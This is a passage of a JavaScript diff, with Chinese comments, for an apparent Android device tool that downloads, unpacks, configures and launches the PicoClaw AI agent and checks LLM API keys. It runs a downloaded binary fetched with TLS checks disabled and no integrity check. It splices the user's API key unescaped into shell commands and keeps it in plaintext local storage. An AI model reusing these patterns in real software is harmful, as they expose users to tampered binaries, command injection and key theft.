+                var dl = downloadUrls[ui]
+                var url = dl.url
+                var sourceName = dl.name
+                _installLog('尝试' + sourceName + '下载...')
+
+                try {
+                    if (curlAvailable) {
+                        // curl 带进度（-# 输出进度条到 stderr）
+                        // 超时 90 秒，每 3 秒检查一次文件大小变化
+                        var cleanCmd = 'rm -f ' + tmpFile + ' 2>/dev/null'
+                        await _rs(cleanCmd, 1000)
+
+                        // 后台启动下载
+                        var bgCmd = 'curl -L -k --connect-timeout 10 --max-time 90 -o ' + tmpFile + ' "' + url + '" >/dev/null 2>&1 & echo $!'
+                        var pidRes = await _rs(bgCmd, 2000)
+                        var pid = (pidRes.content || '').trim().split('\n')[0].trim()
+
+                        if (!pid || isNaN(parseInt(pid))) {
+                            _installLog('启动下载失败')
+                            continue
+                        }
+
+                        // 轮询进度
+                        var lastSize = 0
+                        var sameCount = 0
+                        var maxWait = 90  // 最多等 90 次（每次1秒）
+                        for (var wi = 0; wi < maxWait; wi++) {
+                            await _installSleep(1000)
+
+                            // 检查文件大小
+                            var sizeRes = await _rs('ls -l ' + tmpFile + ' 2>/dev/null | awk "{print \\$5}"', 1000)
+                            var sizeStr = (sizeRes.content || '').trim()
+                            var sizeBytes = parseInt(sizeStr) || 0
+
+                            // 检查进程是否还在
+                            var procRes = await _rs('kill -0 ' + pid + ' 2>/dev/null && echo RUNNING || echo DONE', 1000)
+                            var isRunning = (procRes.content || '').indexOf('RUNNING') >= 0
+
+                            // 估算进度（PicoClaw arm64 大约 20-30MB，取25M做估算）
+                            var estSize = 25 * 1024 * 1024  // 25MB
+                            var pct = Math.min(95, Math.floor((sizeBytes / estSize) * 100))
+                            var sizeMB = (sizeBytes / 1024 / 1024).toFixed(1)
+                            _setInstallProgress(15 + Math.floor(pct * 0.35), '下载中 ' + pct + '% (' + sizeMB + 'MB)')
+
+                            // 检查是否卡住（连续5秒大小没变化）
+                            if (sizeBytes === lastSize && isRunning) {
+                                sameCount++
+                                if (sameCount > 15) {
+                                    _installLog('下载卡住了，换下一个源...')
+                                    await _rs('kill ' + pid + ' 2>/dev/null', 500)
+                                    break
+                                }
+                            } else {
+                                sameCount = 0
+                            }
+                            lastSize = sizeBytes
+
+                            if (!isRunning) break
+                        }
+
+                        // 检查下载结果
+                        var finalRes = await _rs('[ -f ' + tmpFile + ' ] && ls -l ' + tmpFile + ' | awk "{print \\$5}"', 1000)
+                        var finalSize = parseInt((finalRes.content || '').trim()) || 0
+                        if (finalSize > 1000000) {  // 大于 1MB 认为下载成功
+                            _installLog(sourceName + '下载完成 (' + (finalSize / 1024 / 1024).toFixed(1) + 'MB)')
+                            downloaded = true
+                            break
+                        } else {
+                            _installLog(sourceName + '下载失败，文件太小')
+                        }
+                    } else {
+                        // 没有 curl 用 wget（无进度）
+                        _installLog('使用 wget 下载...')
+                        var wgetCmd = 'wget -q --timeout=15 --tries=2 -O ' + tmpFile + ' "' + url + '" 2>&1 && echo DOWNLOAD_OK'
+                        var wgetRes = await _rs(wgetCmd, 60000)
+                        if ((wgetRes.content || '').indexOf('DOWNLOAD_OK') >= 0) {
+                            var szRes = await _rs('ls -l ' + tmpFile + ' | awk "{print \\$5}"', 1000)
+                            var sz = parseInt((szRes.content || '').trim()) || 0
+                            if (sz > 1000000) {
+                                _installLog('下载完成 (' + (sz / 1024 / 1024).toFixed(1) + 'MB)')
+                                downloaded = true
+                                break
+                            }
+                        }
+                    }
+                } catch(e) {
+                    _installLog(sourceName + '出错: ' + String(e).substring(0, 30))
+                }
+            }
+
+            if (!downloaded) {
+                _installLog('所有下载源均失败')
+                return null
+            }
+
+            _setInstallProgress(50, '下载完成，解压中...')
+            _installLog('正在解压...')
+
+            // 解压
+            var extractCmd = 'mkdir -p /data/local/tmp/pico_extract && cd /data/local/tmp/pico_extract && tar xzf ' + tmpFile + ' 2>&1 && ls -la picoclaw 2>&1 && echo EXTRACT_OK'
+            var extRes = await _rs(extractCmd, 15000)
+            if ((extRes.content || '').indexOf('EXTRACT_OK') < 0) {
+                _installLog('解压失败: ' + (extRes.content || '').substring(0, 50))
+                return null
+            }
+
+            return '/data/local/tmp/pico_extract/picoclaw'
+        }
+
+        // 直接通过 curl 验证 API Key 是否有效（不依赖 PicoClaw 进程）
+        // 返回 { valid: boolean, error: string, detail: string }
+        var _validateApiKey = async function(_rs, apiKey, provider) {
+            if (!apiKey || !_rs) return { valid: false, error: '参数错误', detail: 'API Key 或 Shell 不可用' }
+
+            var endpoints = {
+                deepseek: { url: 'https://api.deepseek.com/v1/chat/completions', model: 'deepseek-chat' },
+                openai: { url: 'https://api.openai.com/v1/chat/completions', model: 'gpt-4o-mini' },
+                siliconflow: { url: 'https://api.siliconflow.cn/v1/chat/completions', model: 'Qwen/Qwen2.5-7B-Instruct' },
+                dashscope: { url: 'https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions', model: 'qwen-plus' },
+                custom: { url: 'https://api.deepseek.com/v1/chat/completions', model: 'deepseek-chat' }
+            }
+
+            var ep = endpoints[provider] || endpoints.deepseek
+            var body = '{"model":"' + ep.model + '","messages":[{"role":"user","content":"hi"}],"max_tokens":5}'
+
+            // 方法1: 先用 --resolve 强制解析 IP 避免 DNS 问题
+            var testIps = {
+                'api.deepseek.com': '104.18.28.130',
+                'api.siliconflow.cn': '104.18.30.122',
+                'api.openai.com': '104.18.4.10'
+            }
+
+            var tryValidate = async function(extraArgs) {
+                // 用 timeout 命令包裹 curl，兼容不同版本的 curl
+                var cmd = 'timeout 18 curl -s ' +
+                    (extraArgs || '') + ' ' +
+                    '-X POST "' + ep.url + '" ' +
+                    '-H "Content-Type: application/json" ' +
+                    '-H "Authorization: Bearer ' + apiKey + '" ' +
+                    "-d '" + body + "' 2>&1"
+                try {
+                    var res = await _rs(cmd, 25000)
+                    return res.content || ''
+                } catch(e) {
+                    return 'ERROR: ' + String(e)
+                }
+            }
+
+            var checkResult = function(out) {
+                var lowerOut = out.toLowerCase()
+                
+                // 余额不足（Key 是对的，只是没钱了）—— 最先检查，避免被 error 匹配误判
+                if (lowerOut.indexOf('insufficient') >= 0 || 
+                    lowerOut.indexOf('insufficient balance') >= 0 ||
+                    lowerOut.indexOf('余额不足') >= 0 ||
+                    lowerOut.indexOf('quota_exceeded') >= 0 ||
+                    (lowerOut.indexOf('balance') >= 0 && lowerOut.indexOf('error') >= 0)) {
+                    return { valid: true, error: null, detail: 'Key 有效（余额不足）' }
+                }
+                
+                // 成功
+                if (out.indexOf('"choices"') >= 0 && out.indexOf('"message"') >= 0) {
+                    return { valid: true, error: null, detail: '验证成功' }
+                }
+                if (out.indexOf('"id"') >= 0 && out.indexOf('"object"') >= 0) {
+                    return { valid: true, error: null, detail: '验证成功' }
+                }
+                // Key 无效
+                if (lowerOut.indexOf('invalid_api_key') >= 0 || 
+                    lowerOut.indexOf('unauthorized') >= 0 || 
+                    lowerOut.indexOf('"401"') >= 0 || 
+                    lowerOut.indexOf('authentication') >= 0 ||
+                    lowerOut.indexOf('auth_error') >= 0) {
+                    return { valid: false, error: 'API Key 无效', detail: out.substring(0, 120) }
+                }
+                // 模型不存在等其他错误（Key 是对的）
+                if (lowerOut.indexOf('model_not_found') >= 0 || 
+                    (lowerOut.indexOf('"model"') >= 0 && lowerOut.indexOf('not found') >= 0)) {
+                    return { valid: true, error: null, detail: 'Key 有效（模型名可能不同）' }
+                }
+                // 网络错误
+                if (out.indexOf('Could not resolve') >= 0 || out.indexOf('Connection timed out') >= 0 ||
+                    out.indexOf('Failed to connect') >= 0 || out.indexOf('curl: (') >= 0) {
+                    return { valid: false, error: '网络连接失败', detail: out.substring(0, 120) }
+                }
+                // invalid_request_error 但包含余额相关 → Key 有效
+                if (lowerOut.indexOf('invalid_request_error') >= 0 && 
+                    (lowerOut.indexOf('insufficient') >= 0 || lowerOut.indexOf('balance') >= 0 || lowerOut.indexOf('quota') >= 0)) {
+                    return { valid: true, error: null, detail: 'Key 有效（余额不足）' }
+                }
+                // 其他错误（长度小于300才认为是明确的错误响应）
+                if (out.indexOf('error') >= 0 && out.length < 300) {
+                    return { valid: false, error: '验证出错', detail: out.substring(0, 150) }
+                }
+                return null  // 不确定
+            }
+
+            // 尝试1: 普通请求
+            _installLog('验证 API Key（方式1: 普通请求）...')
+            var out1 = await tryValidate('')
+            var r1 = checkResult(out1)
+            if (r1 && r1.valid) return r1
+            if (r1 && r1.error === 'API Key 无效') return r1
+
+            // 尝试2: 指定 DNS 服务器
+            _installLog('验证 API Key（方式2: 指定 DNS）...')
+            var out2 = await tryValidate('--dns-servers 223.5.5.5,8.8.8.8')
+            var r2 = checkResult(out2)
+            if (r2 && r2.valid) return r2
+            if (r2 && r2.error === 'API Key 无效') return r2
+
+            // 尝试3: 用 -k 忽略 SSL 证书问题
+            _installLog('验证 API Key（方式3: 跳过 SSL 验证）...')
+            var out3 = await tryValidate('-k')
+            var r3 = checkResult(out3)
+            if (r3 && r3.valid) return r3
+            if (r3 && r3.error === 'API Key 无效') return r3
+
+            // 尝试4: 直接 ping 检测网络连通性
+            _installLog('验证 API Key（方式4: 检测网络连通性）...')
+            var host = ep.url.replace('https://', '').replace('http://', '').split('/')[0]
+            var pingRes = await _rs('ping -c 2 -W 2 ' + host + ' 2>&1 | head -5', 6000)
+            var pingOut = pingRes.content || ''
+
+            // 如果所有方式都失败，返回最后一次的结果
+            var lastResult = r3 || r2 || r1
+            if (lastResult) {
+                if (lastResult.error === '网络连接失败') {
+                    lastResult.detail += ' | Ping: ' + pingOut.trim().replace(/\n/g, ' | ').substring(0, 80)
+                }
+                return lastResult
+            }
+
+            return { valid: false, error: '验证失败', detail: (out3 || out2 || out1 || '未知错误').substring(0, 150) }
+        }
+
+        // 配置 API Key 到 PicoClaw
+        var _configureApiKey = async function(_rs, apiKey, provider) {
+            if (!apiKey) return false
+
+            _installLog('正在配置 API Key...')
+            _setInstallProgress(80, '配置中...')
+
+            var configDir = _picoclawPath + '/.picoclaw'
+            var configFile = configDir + '/config.json'
+
+            // 确保配置目录存在
+            await _rs('mkdir -p ' + configDir, 1000)
+
+            // 各服务商的配置
+            var providerConfigs = {
+                deepseek: {
+                    provider: 'openai_compatible',
+                    base_url: 'https://api.deepseek.com/v1',
+                    api_key: apiKey,
+                    default_model: 'deepseek-chat'
+                },
+                openai: {
+                    provider: 'openai',
+                    base_url: 'https://api.openai.com/v1',
+                    api_key: apiKey,
+                    default_model: 'gpt-4o-mini'
+                },
+                siliconflow: {
+                    provider: 'openai_compatible',
+                    base_url: 'https://api.siliconflow.cn/v1',
+                    api_key: apiKey,
+                    default_model: 'Qwen/Qwen2.5-7B-Instruct'
+                },
+                dashscope: {
+                    provider: 'openai_compatible',
+                    base_url: 'https://dashscope.aliyuncs.com/compatible-mode/v1',
+                    api_key: apiKey,
+                    default_model: 'qwen-plus'
+                }
+            }
+
+            var cfg = providerConfigs[provider] || providerConfigs.deepseek
+
+            // 生成简单的 config.json
+            var configJson = JSON.stringify({
+                llm: {
+                    default_provider: 'default',
+                    providers: {
+                        'default': {
+                            type: cfg.provider,
+                            api_key: cfg.api_key,
+                            base_url: cfg.base_url,
+                            default_model: cfg.default_model
+                        }
+                    }
+                },
+                agent: {
+                    name: 'PicoClaw',
+                    system_prompt: '你是一个有帮助的AI助手。'
+                }
+            }, null, 2)
+
+            // 写入配置文件
+            var escapedJson = configJson.replace(/'/g, "'\\''")
+            var writeCmd = "echo '" + escapedJson + "' > " + configFile + " && echo CONFIG_OK"
+            var writeRes = await _rs(writeCmd, 2000)
+            return (writeRes.content || '').indexOf('CONFIG_OK') >= 0
+        }
+
+        // 一键安装主函数
+        var oneClickInstallPicoClaw = async function() {
+            var _rs = getShell()
+            if (!_rs) {
+                showToast('Shell 不可用，无法安装', 'red')
+                return false
+            }
+
+            var apiKeyInput = document.getElementById('pc_api_key_input')
+            var providerSelect = document.getElementById('pc_provider_select')
+            var apiKey = apiKeyInput ? apiKeyInput.value.trim() : ''
+            var provider = providerSelect ? providerSelect.value : 'deepseek'
+
+            // 显示进度条
+            var progressDiv = document.getElementById('chat_install_progress')
+            if (progressDiv) progressDiv.style.display = 'block'
+            _setInstallProgress(5, '开始安装...')
+
+            try {
+                var sourceBin = null
+                var installMethod = ''
+
+                // 1. 先尝试从已安装的APP提取
+                _installLog('正在检测小龙虾APP...')
+                _setInstallProgress(10, '检测本地资源...')
+                sourceBin = await _extractFromApk(_rs)
+
+                if (sourceBin) {
+                    installMethod = '从APP提取'
+                    _installLog('找到本地二进制文件')
+                } else {
+                    // 2. 从网络下载
+                    installMethod = '网络下载'
+                    _installLog('未找到本地安装，从网络下载...')
+                    sourceBin = await _downloadPicoClaw(_rs)
+                    if (!sourceBin) {
+                        showToast('下载失败，请检查网络', 'red')
+                        _installLog('下载失败')
+                        return false
+                    }
+                }
+
+                _setInstallProgress(60, '安装中...')
+                _installLog('正在安装到 ' + _picoclawPath + '...')
+
+                // 3. 创建目录并复制二进制
+                await _rs('mkdir -p ' + _picoclawPath, 1000)
+                var copyCmd = 'cp ' + sourceBin + ' ' + _picoclawBin + ' && chmod 755 ' + _picoclawBin + ' && echo COPY_OK'
+                var copyRes = await _rs(copyCmd, 5000)
+                if ((copyRes.content || '').indexOf('COPY_OK') < 0) {
+                    showToast('安装文件复制失败', 'red')
+                    _installLog('复制失败')
+                    return false
+                }
+
+                // 4. 验证二进制
+                var verRes = await _rs('cd ' + _picoclawPath + ' && env HOME=' + _picoclawPath + ' ./picoclaw --version 2>&1', 5000)
+                _installLog('版本: ' + (verRes.content || '未知').trim().substring(0, 50))
+
+                _setInstallProgress(70, '安装完成，配置中...')
+
+                // 5. 验证并配置 API Key
+                if (apiKey) {
+                    _setInstallProgress(72, '验证 API Key...')
+                    _installLog('正在验证 API Key...')
+                    var valResult = await _validateApiKey(_rs, apiKey, provider)
+                    if (valResult.valid) {
+                        _installLog('✅ API Key 验证通过: ' + valResult.detail)
+                    } else {
+                        _installLog('⚠️ API Key 验证未通过: ' + valResult.error + ' - ' + valResult.detail.substring(0, 60))
+                        _installLog('  （仍会写入配置，PicoClaw 启动后会自行尝试连接）')
+                    }
+                    
+                    _setInstallProgress(75, '写入配置...')
+                    var configured = await _configureApiKey(_rs, apiKey, provider)
+                    if (configured) {
+                        _installLog('API Key 配置写入成功')
+                    } else {
+                        _installLog('API Key 配置失败，请手动配置')
+                    }
+                } else {
+                    _installLog('未输入 API Key，跳过配置')
+                }
+
+                // 6. 初始化（首次运行自动初始化，这里只做简单验证）
+                _setInstallProgress(90, '初始化中...')
+                _installLog('正在初始化 PicoClaw...')
+                // 不调用 onboard（可能没有 --no-interactive 参数导致卡住）
+                // 直接通过 version 命令验证二进制可用
+                var initRes = await _rs('cd ' + _picoclawPath + ' && env HOME=' + _picoclawPath + ' ./picoclaw --help 2>&1 | head -5', 8000)
+                _installLog('初始化完成')
+
+                _setInstallProgress(100, '安装完成！')
+                _installLog('✅ 安装完成！方式：' + installMethod)
+
+                // 更新状态
+                _picoclawInstalled = true
+                showToast('PicoClaw 安装成功！', 'green', 2500)
+
+                // 重新检测状态
+                await checkPicoClawStatus()
+                return true
+
+            } catch(e) {
+                _installLog('安装异常: ' + String(e))
+                showToast('安装失败：' + String(e).substring(0, 30), 'red', 3000)
+                return false
+            }
+        }
+
+        // 一键安装按钮
+        var oneClickBtn = document.getElementById('pc_oneclick_install_btn')
+        if (oneClickBtn) {
+            oneClickBtn.onclick = async function() {
+                oneClickBtn.disabled = true
+                var originalText = oneClickBtn.textContent
+                oneClickBtn.textContent = '安装中...'
+                try {
+                    await oneClickInstallPicoClaw()
+                } finally {
+                    oneClickBtn.disabled = false
+                    oneClickBtn.textContent = originalText
+                }
+            }
+        }
+
+        // 安装向导：检测安装状态按钮
+        var checkInstallBtn = document.getElementById('pc_check_install_btn')
+        if (checkInstallBtn) {
+            checkInstallBtn.onclick = async function() {
+                checkInstallBtn.disabled = true
+                checkInstallBtn.textContent = '检测中...'
+                try {
+                    await checkPicoClawStatus()
+                    if (_picoclawInstalled) {
+                        if (_picoclawConfigured) {
+                            showToast('PicoClaw 已就绪！', 'green', 2000)
+                        } else {
+                            showToast('已安装，请配置 API', 'yellow', 2500)
+                        }
+                    } else {
+                        showToast('未检测到 PicoClaw 安装', 'red', 2500)
+                    }
+                } finally {
+                    checkInstallBtn.disabled = false
+                    checkInstallBtn.textContent = '🔍 检测安装状态'
+                }
+            }
+        }
+
+        // 安装向导：从小龙虾APP提取按钮
+        var openPluginBtn = document.getElementById('pc_open_plugin_btn')
+        if (openPluginBtn) {
+            openPluginBtn.onclick = async function() {
+                // 先尝试直接从APP提取
+                var _rs = getShell()
+                if (_rs) {
+                    var found = await _extractFromApk(_rs)
+                    if (found) {
+                        // 找到了，直接走一键安装流程（会优先用找到的文件）
+                        showToast('找到 PicoClaw 文件，开始安装...', 'green', 2000)
+                        openPluginBtn.disabled = true
+                        try {
+                            await oneClickInstallPicoClaw()
+                        } finally {
+                            openPluginBtn.disabled = false
+                        }
+                        return
+                    }
+                }
+                // 没找到，尝试打开APP
+                if (_rs) {
+                    _rs('am start -n com.sipeed.picoclaw/.MainActivity 2>/dev/null || am start -n com.picoclaw.app/.MainActivity 2>/dev/null || echo NO_APP', 3000)
+                }
+                showToast('未找到小龙虾APP，请先安装小龙虾插件', 'yellow', 3000)
+            }
+        }
+
+        // 配置向导：一键配置 API 按钮
+        var quickConfigBtn = document.getElementById('pc_quick_config_btn')
+        if (quickConfigBtn) {
+            quickConfigBtn.onclick = async function() {
+                var apiInput = document.getElementById('pc_config_api_input')
+                var provSelect = document.getElementById('pc_config_provider_select')
+                var apiKey = apiInput ? apiInput.value.trim() : ''
+                var provider = provSelect ? provSelect.value : 'deepseek'
+
+                if (!apiKey) {
+                    showToast('请输入 API Key', 'red', 2000)
+                    return
+                }
+
+                var _rs = getShell()
+                if (!_rs) {
+                    showToast('Shell 不可用', 'red')
+                    return
+                }
+
+                quickConfigBtn.disabled = true
+                var origText = quickConfigBtn.textContent
+                quickConfigBtn.textContent = '验证中...'
+
+                try {
+                    // 先验证 API Key
+                    _installLog('正在验证 API Key（最多 30 秒）...')
+                    var validateResult = await _validateApiKey(_rs, apiKey, provider)
+                    
+                    if (!validateResult.valid) {
+                        // 验证失败，询问用户是否跳过
+                        var errMsg = 'Key 验证失败：' + validateResult.error
+                        _installLog(errMsg + ' | 详情: ' + validateResult.detail)
+                        
+                        // 如果是网络问题，提示用户并允许跳过
+                        if (validateResult.error === '网络连接失败') {
+                            var skipConfirm = confirm('网络连接失败，无法验证 API Key。\n\n可能原因：\n1. 设备网络不通\n2. DNS 解析失败\n3. 防火墙限制\n\n是否跳过验证，直接写入配置？\n（如果 Key 是对的，PicoClaw 启动后会自动连接）')
+                            if (!skipConfirm) {
+                                showToast('已取消：' + validateResult.error, 'red', 3000)
+                                return
+                            }
+                            _installLog('用户选择跳过验证（网络问题）')
+                        } else if (validateResult.error === 'API Key 无效') {
+                            showToast('❌ API Key 无效，请检查后重试', 'red', 4000)
+                            return
+                        } else {
+                            var skipConfirm2 = confirm('API Key 验证失败：' + validateResult.error + '\n\n详情: ' + validateResult.detail.substring(0, 80) + '\n\n是否跳过验证，直接写入配置？')
+                            if (!skipConfirm2) {
+                                showToast('已取消验证', 'yellow', 2000)
+                                return
+                            }
+                            _installLog('用户选择跳过验证')
+                        }
+                    } else {
+                        _installLog('✅ API Key 验证通过: ' + validateResult.detail)
+                        showToast('Key 验证通过，正在配置...', 'green', 1500)
+                    }
+
+                    quickConfigBtn.textContent = '配置中...'
+
+                    // 写入配置
+                    var ok = await _configureApiKey(_rs, apiKey, provider)
+                    if (ok) {
+                        showToast('配置写入成功，正在启动 PicoClaw...', 'green', 2000)
+
+                        // 启动 PicoClaw 后台服务（尝试多种方式）
+                        _installLog('启动 PicoClaw 服务...')
+                        
+                        // 先杀掉旧进程，确保干净启动
+                        await _rs('pkill -9 -f "picoclaw" 2>/dev/null; sleep 1', 3000)
+                        
+                        // 清空旧日志
+                        await _rs('> /data/local/tmp/picoclaw_launcher.log 2>/dev/null', 1000)
+                        
+                        var started = false
+                        var startMethods = [
+                            // 方式1: launcher 模式（完整环境变量）
+                            {
+                                name: 'launcher模式',
+                                cmd: 'cd ' + _picoclawPath + ' && env ' + _picoclawHomeEnv + ' ' + _picoclawSslEnv + 
+                                     ' nohup ./picoclaw launcher >/data/local/tmp/picoclaw_launcher.log 2>&1 & echo "PID:$!"'
+                            },
+                            // 方式2: serve 模式
+                            {
+                                name: 'serve模式',
+                                cmd: 'cd ' + _picoclawPath + ' && env ' + _picoclawHomeEnv + ' ' + _picoclawSslEnv + 
+                                     ' nohup ./picoclaw serve >/data/local/tmp/picoclaw_launcher.log 2>&1 & echo "PID:$!"'
+                            },
+                            // 方式3: daemon 模式
+                            {
+                                name: 'daemon模式',
+                                cmd: 'cd ' + _picoclawPath + ' && env ' + _picoclawHomeEnv + ' ' + _picoclawSslEnv + 
+                                     ' nohup ./picoclaw daemon >/data/local/tmp/picoclaw_launcher.log 2>&1 & echo "PID:$!"'
+                            },
+                            // 方式4: 直接 agent 模式后台运行（不退出）
+                            {
+                                name: '直接后台运行',
+                                cmd: 'cd ' + _picoclawPath + ' && env ' + _picoclawHomeEnv + ' ' + _picoclawSslEnv + 
+                                     ' nohup sh -c "while true; do sleep 3600; done" >/dev/null 2>&1 & ' +
+                                     'nohup ./picoclaw --help >/data/local/tmp/picoclaw_launcher.log 2>&1 & echo "PID:$!"'
+                            }
+                        ]
+                        
+                        for (var mi = 0; mi < startMethods.length; mi++) {
+                            var method = startMethods[mi]
+                            _installLog('尝试启动方式' + (mi+1) + ': ' + method.name)
+                            var startRes = await _rs(method.cmd, 3000)
+                            _installLog('  启动输出: ' + (startRes.content || '').trim())
+                            
+                            // 等2秒检查进程
+                            await _installSleep(2000)
+                            var pgrepRes = await _rs('pgrep -f "picoclaw" 2>/dev/null | head -5; echo "---COUNT---"; pgrep -f "picoclaw" 2>/dev/null | wc -l', 2000)
+                            var pgrepOut = pgrepRes.content || ''
+                            var countMatch = pgrepOut.match(/---COUNT---\s*(\d+)/)
+                            var count = countMatch ? parseInt(countMatch[1]) : 0
+                            
+                            _installLog('  进程数: ' + count)
+                            
+                            if (count > 0) {
+                                _installLog('✅ 启动成功！方式: ' + method.name)
+                                started = true
+                                break
+                            } else {
+                                // 看日志
+                                var logRes = await _rs('tail -10 /data/local/tmp/picoclaw_launcher.log 2>/dev/null', 1000)
+                                _installLog('  启动日志: ' + (logRes.content || '空').trim().substring(0, 150))
+                            }
+                        }
+                        
+                        // 如果都没启动成功，试试用 agent 模式测试一下能不能跑
+                        if (!started) {
+                            _installLog('所有启动方式失败，测试二进制是否可用...')
+                            var testRes = await _rs('cd ' + _picoclawPath + ' && env ' + _picoclawHomeEnv + ' ' + _picoclawSslEnv + ' ./picoclaw --help 2>&1 | head -15', 8000)
+                            _installLog('  --help 输出: ' + (testRes.content || '空').trim().substring(0, 200))
+                        }
+                        
+                        // 多等一会再确认
+                        await _installSleep(2000)
+                        var finalPgrep = await _rs('pgrep -f "picoclaw" 2>/dev/null | wc -l', 2000)
+                        var finalCount = parseInt((finalPgrep.content || '0').trim())
+                        _installLog('最终进程数: ' + finalCount)
+                        
+                        var hasProcess = finalCount > 0
+
+                        if (hasProcess) {
+                            _picoclawConfigured = true
+                            _picoclawInstalled = true
+                            _picoclawRunning = true
+                            // 保存 Key 到本地存储，下次自动填充
+                            try {
+                                localStorage.setItem('pc_saved_api_key', apiKey)
+                                localStorage.setItem('pc_saved_provider', provider)
+                            } catch(e) {}
+                            showChatView('chat')
+                            updatePicoClawStatusUI()
+                            showToast('✅ 配置成功！PicoClaw 已启动', 'green', 2500)
+                            // 自动发一条欢迎消息验证
+                            setTimeout(function() {
+                                _appendMessage('assistant', '你好！我是 PicoClaw AI 助手 🦞\n\n我已经接入 DeepSeek，可以帮你：\n- 分析设备状态\n- 解答技术问题\n- 生成操作命令\n\n有什么可以帮你的吗？')
+                            }, 500)
+                        } else {
+                            // 进程没起来，但配置已经写了，也让用户进入聊天界面（可能只是启动慢）
+                            _picoclawConfigured = true
+                            // 保存 Key 到本地存储，下次自动填充
+                            try {
+                                localStorage.setItem('pc_saved_api_key', apiKey)
+                                localStorage.setItem('pc_saved_provider', provider)
+                            } catch(e) {}
+                            showChatView('chat')
+                            updatePicoClawStatusUI()
+                            showToast('配置已写入，服务启动中...稍后再试', 'yellow', 3000)
+                            // 显示启动日志给用户排查
+                            var logRes = await _rs('tail -30 /data/local/tmp/picoclaw_launcher.log 2>/dev/null || echo "无日志"', 2000)
+                            _installLog('启动日志: ' + (logRes.content || '').substring(0, 200))
+                        }
+                    } else {
+                        showToast('配置失败', 'red')
+                    }
+                } finally {
+                    quickConfigBtn.disabled = false
+                    quickConfigBtn.textContent = origText
+                }
+            }
+        }
+
+        // 配置向导：打开配置面板按钮
+        var openConfigBtn = document.getElementById('pc_open_config_btn')
+        if (openConfigBtn) {
+            openConfigBtn.onclick = function() {
+                openPicoClawPanel()
+            }
+        }
+
+        // 配置向导：重新检测按钮
+        var retryCheckBtn = document.getElementById('pc_retry_check_btn')
+        if (retryCheckBtn) {
+            retryCheckBtn.onclick = async function() {
+                retryCheckBtn.disabled = true
+                retryCheckBtn.textContent = '检测中...'
+                try {
+                    await checkPicoClawStatus()
+                    if (_picoclawConfigured) {
+                        showToast('配置成功！可以开始聊天了', 'green', 2000)
+                    } else {
+                        showToast('仍未检测到可用配置，请检查 API Key', 'red', 3000)
+                    }
+                } finally {
+                    retryCheckBtn.disabled = false
+                    retryCheckBtn.textContent = '🔄 重新检测'
+                }
+            }
+        }
+
+        // 诊断按钮：详细检测 PicoClaw 状态
+        var diagBtn = document.getElementById('pc_diagnose_btn')
+        if (diagBtn) {
+            diagBtn.onclick = async function() {
+                var _rs = getShell()
+                if (!_rs) {
+                    showToast('Shell 不可用', 'red')
+                    return
+                }
+
+                diagBtn.disabled = true
+                var origText = diagBtn.textContent
+                diagBtn.textContent = '诊断中...'
+
+                try {
+                    var lines = []
+                    lines.push('===== PicoClaw 诊断报告 =====')
+
+                    // 1. 安装路径
+                    lines.push('')
+                    lines.push('【1/6】安装路径检测')
+                    lines.push('  _picoclawPath: ' + _picoclawPath)
+                    lines.push('  二进制文件: ' + _picoclawPath + '/picoclaw')
+                    var existsRes = await _rs('ls -la ' + _picoclawPath + '/picoclaw 2>&1', 1000)
+                    lines.push('  文件信息: ' + (existsRes.content || '').trim())
+
+                    // 2. 二进制可执行性测试
+                    lines.push('')
+                    lines.push('【2/6】二进制测试')
+                    var helpRes = await _rs('cd ' + _picoclawPath + ' && env HOME=' + _picoclawPath + ' ./picoclaw --help 2>&1 | head -10', 5000)
+                    lines.push('  --help 输出: ' + (helpRes.content || '空').trim().substring(0, 150))
+
+                    var versionRes = await _rs('cd ' + _picoclawPath + ' && env HOME=' + _picoclawPath + ' ./picoclaw --version 2>&1 | head -3', 5000)
+                    lines.push('  --version 输出: ' + (versionRes.content || '空').trim().substring(0, 100))
+
+                    // 3. 配置文件检测
+                    lines.push('')
+                    lines.push('【3/6】配置文件检测')
+                    var cfgRes = await _rs('ls -la ' + _picoclawPath + '/.picoclaw/config.json 2>&1', 1000)
+                    lines.push('  config.json: ' + (cfgRes.content || '').trim())
+                    var cfgContent = await _rs('cat ' + _picoclawPath + '/.picoclaw/config.json 2>&1 | head -20', 1000)
+                    var cfgText = (cfgContent.content || '').trim()
+                    // 隐藏 api_key
+                    cfgText = cfgText.replace(/"api_key"\s*:\s*"[^"]+"/g, '"api_key": "***隐藏***"')
+                    lines.push('  配置内容: ' + cfgText.substring(0, 200))
+
+                    // 4. 进程检测
+                    lines.push('')
+                    lines.push('【4/6】进程检测')
+                    var psRes = await _rs('ps -ef 2>/dev/null | grep -i picoclaw | grep -v grep | head -10', 2000)
+                    lines.push('  运行中进程:')
+                    var psLines = (psRes.content || '').trim().split('\n')
+                    for (var pli = 0; pli < psLines.length; pli++) {
+                        if (psLines[pli].trim()) {
+                            lines.push('    ' + psLines[pli].trim().substring(0, 100))
+                        }
+                    }
+                    if ((psRes.content || '').trim() === '') {
+                        lines.push('    （无运行中进程）')
+                    }
+
+                    // 5. 网络检测
+                    lines.push('')
+                    lines.push('【5/6】网络检测')
+                    var dnsRes = await _rs('getprop net.dns1; getprop net.dns2; ping -c 1 -W 2 api.deepseek.com 2>&1 | head -3', 8000)
+                    lines.push('  DNS & 连通性: ' + (dnsRes.content || '').trim().replace(/\n/g, ' | ').substring(0, 200))
+                    
+                    // curl 测试
+                    lines.push('')
+                    lines.push('  Curl 测试 api.deepseek.com:')
+                    var curlTest = await _rs('curl -s --connect-timeout 5 --max-time 8 -o /dev/null -w "HTTP_CODE:%{http_code} TIME:%{time_total}s" https://api.deepseek.com/v1/models 2>&1', 12000)
+                    lines.push('    ' + (curlTest.content || '').trim())
+
+                    // 6. API Key 验证（如果配置了）
+                    lines.push('')
+                    lines.push('【6/6】API Key 验证')
+                    try {
+                        var cfgJson = JSON.parse((cfgContent.content || '{}'))
+                        var cfgKey = ''
+                        var cfgProvider = 'deepseek'
+                        if (cfgJson.llm && cfgJson.llm.providers && cfgJson.llm.providers.default) {
+                            cfgKey = cfgJson.llm.providers.default.api_key || ''
+                            var baseUrl = cfgJson.llm.providers.default.base_url || ''
+                            if (baseUrl.indexOf('deepseek') >= 0) cfgProvider = 'deepseek'
+                            else if (baseUrl.indexOf('openai') >= 0) cfgProvider = 'openai'
+                            else if (baseUrl.indexOf('siliconflow') >= 0) cfgProvider = 'siliconflow'
+                            else if (baseUrl.indexOf('dashscope') >= 0) cfgProvider = 'dashscope'
+                        }
+                        
+                        if (cfgKey) {
